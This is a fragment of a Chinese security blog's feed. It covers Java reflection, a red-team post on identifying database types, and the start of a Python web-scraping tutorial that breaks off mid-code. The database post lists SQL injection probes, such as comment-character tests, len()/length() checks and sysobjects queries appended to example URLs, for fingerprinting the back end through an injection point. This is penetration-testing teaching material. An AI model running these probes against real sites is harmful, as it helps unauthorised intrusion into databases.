Execute)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Java反射机制&quot;&gt;&lt;a href=&quot;#Java反射机制&quot; class=&quot;headerlink&quot; title=&quot;Java反射机制&quot;&gt;&lt;/a&gt;Java反射机制&lt;/h3&gt;&lt;p&gt;​    对于Java反序列化漏洞来说，Java反射机制必须理解，本章专门用来说明什么是Ja</summary>
      
    
    
    
    <category term="Java安全基础篇" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="反射" scheme="http://example.com/tags/%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>数据库攻击面😪</title>
    <link href="http://example.com/2022/08/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB%E9%9D%A2%F0%9F%98%AA/"/>
    <id>http://example.com/2022/08/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB%E9%9D%A2%F0%9F%98%AA/</id>
    <published>2022-08-26T01:35:18.000Z</published>
    <updated>2023-04-15T07:44:20.249Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h2><h3 id="常见前端与数据库类型"><a href="#常见前端与数据库类型" class="headerlink" title="常见前端与数据库类型"></a>常见前端与数据库类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asp：SQL Server，Access</span><br><span class="line"></span><br><span class="line">.net：SQL Server</span><br><span class="line"></span><br><span class="line">php：MySQL，PostgreSQL</span><br><span class="line"></span><br><span class="line">java：Oracle，MySQL</span><br></pre></td></tr></table></figure><h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Oracle：默认端口1521</span><br><span class="line">SQL Server：默认端口1433</span><br><span class="line">MySQL：默认端口3306</span><br></pre></td></tr></table></figure><h3 id="特有函数判断"><a href="#特有函数判断" class="headerlink" title="特有函数判断"></a>特有函数判断</h3><p>version()和@@version()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  ORACLE : <span class="keyword">Select</span> banner <span class="keyword">from</span> v$version;</span><br><span class="line"><span class="number">2.</span>  MS<span class="operator">-</span><span class="keyword">SQL</span> : <span class="keyword">Select</span> @<span class="variable">@version</span>;</span><br><span class="line"><span class="number">3.</span>  MYSQL : <span class="keyword">Select</span> @<span class="variable">@version</span>;</span><br><span class="line"><span class="number">4.</span>  postgresql : <span class="keyword">Select</span> version();</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>  <span class="keyword">select</span> version()：#MySQL查询版本信息的函数</span><br><span class="line"><span class="number">6.</span>  <span class="keyword">select</span> @<span class="variable">@version</span>：#MySQL和<span class="keyword">SQL</span> Server查询版本信息的函数</span><br></pre></td></tr></table></figure><p>Len()和length()</p><p>​    在mssql以及db2内，返回长度值是调用len()函数；在oracle和mysql则是通过length()来返回长度值。</p><pre><code> 当你使用and len(&#39;a&#39;)=1的时候，返回正常页面时，可以推断当前的数据库类型可能是mssql，或是db2。反之则可能会是oracle和mysql。</code></pre><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73442.jpg"                      alt="image-20220826163018908"                ></p><p>substring和substr</p><p>​    MySQL两个函数都可以使用<br>​    Oracle只可调用substr<br>​    SQL Server只可调用substring</p><h3 id="符号判断"><a href="#符号判断" class="headerlink" title="符号判断"></a>符号判断</h3><p>​    “#”是MySQL中的注释符，另外也支持<code>--</code> 和<code>/**/</code>，返回错误说明该注入点不是MySQL，继续提交如下查询字符：</p><p>​    “–”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：</p><p>​    “;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</p><p>​    有时利用–和# 这两个注释符号也可以大致的确认数据库类型，因为MSSQL是–，而MYSQL是#，ACCESS不支持注释。</p><p>​    Http://xxx.xxx.xxx/abc.asp?p=YY– 异常</p><p>​    HTTP://xxx.xxx.xxx/abc.asp?p=YY#  正常</p><p>​    那么数据库有可能就是MYSQL或者ACCESS。</p><pre><code> 在注入点后加（必须为注入点）;--（一个分号，两个横线），例如：</code></pre><p>​    Http://xxxx/article/as.asp?id=1;–</p><p>​    如果返回正常的话，说明数据库是MSSQL。在MSSQL数据库中;和–都是存在的，;用来分离两个语句，而–就是注释符，它后面语句都不执行。如果返回错误，基本可以肯定是ACCESS数据库了。</p><h3 id="根据数据库对字符串的处理方式判断"><a href="#根据数据库对字符串的处理方式判断" class="headerlink" title="根据数据库对字符串的处理方式判断"></a>根据数据库对字符串的处理方式判断</h3><p>​    MySQL ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;a&#x27;+&#x27;b&#x27;=&#x27;ab&#x27; </span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;a&#x27;,&#x27;b&#x27;)=&#x27;ab&#x27; </span><br></pre></td></tr></table></figure><p>​    Oracle ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;a&#x27;||&#x27;b&#x27;=&#x27;ab&#x27; </span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;a&#x27;,&#x27;b&#x27;)=&#x27;ab&#x27; </span><br></pre></td></tr></table></figure><p>​    SQL Server ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;a&#x27;+&#x27;b&#x27;=&#x27;ab&#x27; </span><br></pre></td></tr></table></figure><h3 id="数据库特征"><a href="#数据库特征" class="headerlink" title="数据库特征"></a>数据库特征</h3><p>​    MYSQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=2 and version()&gt;0 返回正常</span><br><span class="line"></span><br><span class="line">id=2 and length(user())&gt;0</span><br><span class="line"></span><br><span class="line">id=2 and CHAR(97, 110, 100, 32, 49, 61, 49)</span><br></pre></td></tr></table></figure><p>​    MSSQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ID=1 and (select count (*) from sysobjects)&gt;0 返回正常</span><br><span class="line"></span><br><span class="line">ID=1 and (select count (*) from msysobjects)&gt;0返回异常</span><br><span class="line"></span><br><span class="line">ID=1 and left(version(),1)= 5%23</span><br><span class="line"></span><br><span class="line">ID=1 and exists(select id from sysobjects)</span><br><span class="line"></span><br><span class="line">ID=1 and length(user)&gt;0</span><br><span class="line"></span><br><span class="line">ID=1 CHAR(97) + CHAR(110) + CHAR(100) + CHAR(32) + CHAR(49) + CHAR(61) + CHAR(49)</span><br></pre></td></tr></table></figure><p>​    ACCESS：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID=1 and (select count (*) from sysobjects)&gt;0 返回异常</span><br><span class="line"></span><br><span class="line">ID=1 and (select count (*) from msysobjects)&gt;0返回异常</span><br></pre></td></tr></table></figure><p>​    ORACLE:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ID=1  and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11 </span><br><span class="line"></span><br><span class="line">ID=1  and 0&lt;&gt;(select count(*) from dual)</span><br><span class="line"></span><br><span class="line">ID=1 CHR(97) || CHR(110) || CHR(100) || CHR(32) || CHR(49) || CHR(61) || CHR(49)</span><br></pre></td></tr></table></figure><hr><hr><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p>​    首先我们启动一个docker，对于docker不会的可以去看我以前的文章，里面介绍的很详细。</p><p>​    启动一个mysql容器，已经启动成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 3307:3306 --name mes9s0-mysql -v ~/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=password  容器ID</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073442.jpg"                      alt="image-20220826121507284"                ></p><p>​    注意：1、端口映射唯一性：一个容器只能映射到本机的唯一一个端口，故如果创建了一个容器，该容器在运行中，该容器映射到本地的端口为3306， 那么就不能再创建一个容器映射在3306端口号上，因为该端口已经被分配给了第一个容器；2、容器名字唯一性：创建的容器的名字不能与已经存在 的容器名字重复。否则创建容器失败。</p><p>​    可以写一个docker-compose.yml，方便下次启动</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mysql-database:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;3307:3306&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">数据库名</span>  <span class="string">//</span> <span class="string">这里docker</span> <span class="string">在启动的时候，会自动创建该数据库，不需要手动去创建</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">数据库密码</span></span><br></pre></td></tr></table></figure><p>​    然后我们启动phpmyadmin的容器，启动方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动镜像</span></span><br><span class="line">docker run -d --name phpmyadmin --<span class="built_in">link</span> mes9s0-mysql:db -p 8080:80 phpmyadmin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改容器配置文件</span></span><br><span class="line">docker <span class="built_in">cp</span> phpmyadmin:/etc/phpmyadmin/config.inc.php .</span><br><span class="line"></span><br><span class="line"><span class="comment">## 修改配置文件信息(这里修改的db就是在启动的时候--link后面指定的别名)</span></span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;host&#x27;</span>] = <span class="string">&#x27;localhost&#x27;</span> ——&gt; <span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;host&#x27;</span>] = <span class="string">&#x27;db&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 将修改后的配置文件复制回容器中</span></span><br><span class="line">docker <span class="built_in">cp</span> ./config.inc.php phpmyadmin:/etc/phpmyadmin/</span><br><span class="line"></span><br><span class="line">docker restart phpmyadmin</span><br></pre></td></tr></table></figure><p>​    这里提供一个网络的docker-compose（没试过，可以修改试试）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">hub.c.163.com/library/mysql</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">test-mysql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">&quot;root&quot;</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">&quot;root&quot;</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">&quot;root&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">net-mysql</span></span><br><span class="line">  <span class="attr">phpmyadmin:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.io/phpmyadmin/phpmyadmin</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">test-myadmin</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">&quot;root&quot;</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">&quot;root&quot;</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">&quot;root&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">net-mysql</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">net-mysql:</span></span><br></pre></td></tr></table></figure><p>​    另外：关于phpmyadmin的启动方法可看以下文章：<a class="link"   href="https://www.jb51.net/article/235796.htm%E3%80%82%E9%A1%BA%E4%BE%BF%E8%AF%B4%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%90%AF%E5%8A%A8%E5%90%8Echrome%E6%89%93%E5%BC%80%E4%BC%9A%E6%9C%89cookie%E7%9B%B8%E5%85%B3%E9%94%99%E8%AF%AF%EF%BC%8C%E6%88%91%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8firefox%E6%89%93%E5%BC%80%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%B7%B2%E7%BB%8F%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE%E3%80%82" >https://www.jb51.net/article/235796.htm。顺便说一下，启动后chrome打开会有cookie相关错误，我这里使用firefox打开，可以看到已经成功访问。<i class="fas fa-external-link-alt"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073444.jpg"                      alt="image-20220826133409628"                ></p><h3 id="Mysql攻击面"><a href="#Mysql攻击面" class="headerlink" title="Mysql攻击面"></a>Mysql攻击面</h3><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;数据库类型判断&quot;&gt;&lt;a href=&quot;#数据库类型判断&quot; class=&quot;headerlink&quot; title=&quot;数据库类型判断&quot;&gt;&lt;/a&gt;数据库类型判断&lt;/h2&gt;&lt;h3 id=&quot;常见前端与数据库类型&quot;&gt;&lt;a href=&quot;#常见前端与数据库类型&quot; class=&quot;head</summary>
      
    
    
    
    <category term="数据库攻击汇总篇" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB%E7%AF%87/"/>
    
    
    <category term="红队" scheme="http://example.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="REDTEAM" scheme="http://example.com/tags/REDTEAM/"/>
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Python爬虫从零到一</title>
    <link href="http://example.com/2022/08/13/Python%E7%88%AC%E8%99%AB%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/"/>
    <id>http://example.com/2022/08/13/Python%E7%88%AC%E8%99%AB%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</id>
    <published>2022-08-13T14:12:29.000Z</published>
    <updated>2023-04-15T07:44:20.600Z</updated>
    
    <content type="html"><![CDATA[<p>​    无前言</p><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><p>​    robots.txt协议： 君⼦协议。规定了⽹站中哪些数据可以被爬⾍爬取，哪些数据不可以被爬取。一些网站的waf会拦，可以访问下看看有没有waf（不拦不代表没有）。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073950.jpg"                      alt="image-20220905153145473"                ></p><h4 id="py字符集问题"><a href="#py字符集问题" class="headerlink" title="py字符集问题"></a>py字符集问题</h4><p>​    python里有一个open()函数，我们看看这个open()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=<span class="literal">None</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span></span>): <span class="comment"># known special case of open</span></span><br></pre></td></tr></table></figure><p>​    其中有一个encoding，其作用是当对文件进行操作的时候，是以指定的编码格式进行操作的。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073953.jpg"                      alt="image-20220905154928627"                ></p><p>​    如果乱码程序输出报错的，可以看看是不是这里出了问题。</p><h4 id="第一个小爬虫"><a href="#第一个小爬虫" class="headerlink" title="第一个小爬虫"></a>第一个小爬虫</h4><p>​    我们需要⽤代码来模拟⼀个浏览器, 然后同 样的输⼊百度的⽹址. 那么我们的程序应该也能拿到百度的内容。在python中, 我们可以直接⽤urllib模块来完成对浏览器的模拟⼯作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">resp = urlopen(url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><p>​    我们看到的回显是这样的，前面有一个b’，这其实代表字节，我们需要在程序里还原成字符串才可正常显示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073954.jpg"                      alt="image-20220905155803589"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">resp = urlopen(url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073956.jpg"                      alt="image-20220905160011971"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">resp = urlopen(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mybaidu.html&quot;</span>,mode=<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(resp.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="web请求剖析"><a href="#web请求剖析" class="headerlink" title="web请求剖析"></a>web请求剖析</h4><p>​    在访问百度的时候, 浏览器会把这⼀次请求发 送到百度的服务器(百度的⼀台电脑), 由服务器接收到这个请求, 然后 加载⼀些数据. 返回给浏览器, 再由浏览器进⾏显示. 听起来好像是个 废话…但是这⾥蕴含着⼀个极为重要的东⻄在⾥⾯, 注意, 百度的服 务器返回给浏览器的不直接是⻚⾯, ⽽是⻚⾯源代码(由html, css, js 组成). 由浏览器把⻚⾯源代码进⾏执⾏, 然后把执⾏之后的结果展示给⽤户。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073958.jpg"                      alt="image-20220905161042636"                ></p><p>​    下面看看常见的页面渲染数据的过程，我们常⻅的⻚⾯渲染过程有两种。</p><h5 id="服务器渲染"><a href="#服务器渲染" class="headerlink" title="服务器渲染"></a>服务器渲染</h5><p>​    这个是最简单的. 含义呢就是我们在请求到服务 器的时候, 服务器直接把数据全部写⼊到html中, 我们浏览器就 能直接拿到带有数据的html内容. ⽐如, 由于数据是直接写在html中的, 所以我们能看到的数据都在⻚⾯ 源代码中能找的到的. 这种⽹⻚⼀般都相对⽐较容易就能抓取到⻚⾯内容。</p><h5 id="前端JS渲染"><a href="#前端JS渲染" class="headerlink" title="前端JS渲染"></a>前端JS渲染</h5><p>​    这种就稍显麻烦了. 这种机制⼀般是第⼀次请求服务器返回⼀堆 HTML框架结构. 然后再次请求到真正保存数据的服务器, 由这个 服务器返回数据, 最后在浏览器上对数据进⾏加载。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73960.jpg"                      alt="image-20220905161347999"                ></p><p>​    这样做的好处是服务器那边能缓解压⼒. ⽽且分⼯明确. ⽐较容易维护。那数据是何时加载进来的呢? 其实就是在我们进⾏⻚⾯向下滚动 的时候, jd就在偷偷的加载数据了, 此时想要看到这个⻚⾯的加 载全过程, 我们就需要借助浏览器的调试⼯具了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074001.jpg"                      alt="image-20220905161638026"                ></p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>​    HTTP协议, Hyper Text Transfer Protocol（超⽂本传输协议）的缩 写,是⽤于从万维⽹(WWW:World Wide Web)服务器传输超⽂本 到本地浏览器的传送协议. 直⽩点⼉, 就是浏览器和服务器之间的数 据交互遵守的就是HTTP协议.</p><p>​    请求:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求⾏ -&gt; 请求⽅式(get/post) 请求url地址 协议</span><br><span class="line">请求头 -&gt; 放⼀些服务器要使⽤的附加信息</span><br><span class="line"></span><br><span class="line">请求体 -&gt; ⼀般放⼀些请求参数</span><br></pre></td></tr></table></figure><p>​    响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态⾏ -&gt; 协议 状态码</span><br><span class="line">响应头 -&gt; 放⼀些客户端要使⽤的⼀些附加信息</span><br><span class="line"></span><br><span class="line">响应体 -&gt; 服务器返回的真正客户端要⽤的内容(HTML,json)等</span><br></pre></td></tr></table></figure><p>​    写爬⾍的时候要格外注意请求头和响应头. 这两个地⽅⼀ 般都隐含着⼀些⽐较重要的内容。请求头中最常⻅的⼀些重要内容(爬⾍需要):</p><pre><code>1. User-Agent : 请求载体的身份标识(⽤啥发送的请求) 1. Referer: 防盗链(这次请求是从哪个⻚⾯来的? 反爬会⽤到) 1. cookie: 本地字符串数据信息(⽤户登录信息, 反爬的token)</code></pre><p>​    响应头中⼀些重要的内容:</p><ol><li>cookie: 本地字符串数据信息(⽤户登录信息, 反爬的token) </li><li>各种神奇的莫名其妙的字符串(这个需要经验了, ⼀般都是token 字样, 防⽌各种攻击和反爬)</li></ol><h4 id="requests模块⼊⻔–GET"><a href="#requests模块⼊⻔–GET" class="headerlink" title="requests模块⼊⻔–GET"></a>requests模块⼊⻔–GET</h4><p>​    在前⾯⼩节中, 我们使⽤urllib来抓取⻚⾯源代码. 这个是python内置的⼀个模块. 但是, 它并不是我们常⽤的爬⾍⼯具. 常⽤的抓取⻚⾯的 模块通常使⽤⼀个第三⽅模块requests. 这个模块的优势就是⽐urllib 还要简单, 并且处理各种请求都⽐较⽅便</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install requests</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074002.jpg"                      alt="image-20220905221222888"                ></p><p>​    接下来我们来看看requests能带给我们什么。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">query = <span class="built_in">input</span>(<span class="string">&quot;输入一个人:&quot;</span>)</span><br><span class="line">url = <span class="string">f&#x27;https://www.sogou.com/web?query=<span class="subst">&#123;query&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kw = <span class="built_in">input</span>(<span class="string">&quot;请输⼊你要搜索的内容:&quot;</span>)</span><br><span class="line">response = requests.get(<span class="string">f&quot;https://www.sogou.com/web?query=<span class="subst">&#123;kw&#125;</span>&quot;</span>) <span class="comment"># 发送get请求</span></span><br><span class="line"><span class="comment"># print(response.text) # 直接拿结果(⽂本)</span></span><br><span class="line"><span 